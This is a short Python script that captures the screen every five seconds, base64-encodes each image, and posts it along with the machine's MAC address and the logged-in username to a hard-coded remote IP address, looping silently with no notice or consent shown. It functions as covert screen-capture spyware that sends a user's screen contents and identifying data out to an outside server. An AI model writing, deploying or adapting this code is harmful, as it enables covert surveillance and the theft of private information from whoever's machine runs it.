import PIL
import io
import requests
import traceback
import sys
from time import sleep
from datetime import datetime, timezone
import uuid 
import logging
import os
import pyautogui
import json
import base64
import getpass


logger = logging.getLogger(__name__)

def screen_watcher_loop(poll_time):
    while True:
        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = './temp_ss.png'
            screenshot.save(screenshot_path)
        except Exception as e:
            logger.error("Exception thrown while trying to get screenshot: {}".format(e))
            traceback.print_exc()

        if os.path.isfile(screenshot_path) is False:
            logger.debug('Unable to take screenshot, trying again on next poll')
        else:
            with open(screenshot_path, "rb") as img_file:
                base64_string = base64.b64encode(img_file.read())   

            # Delete screenshot when it is converted to base64_string.
            os.remove(screenshot_path)

            data = {
                "time": datetime.utcnow().strftime("%Y/%m/%d %H:%M:%S"),
                'timezone': 'UTC',
                "mac_adress": hex(uuid.getnode()),
                "computer_name": getpass.getuser(),
                "base64String": base64_string.decode('utf-8')
            }
            json_data = json.dumps(data)
            try:
                response = requests.post('http://45.76.85.26:8080/screenshot/add', json_data)
                # response = requests.post('http://localhost:8080/screenshot/add', json_data)
                logger.warning(response)    
            except requests.exceptions.ConnectionError:
                logger.error("No Internet connection")  

            sleep(poll_time)

if __name__ == "__main__":
    screen_watcher_loop(5)
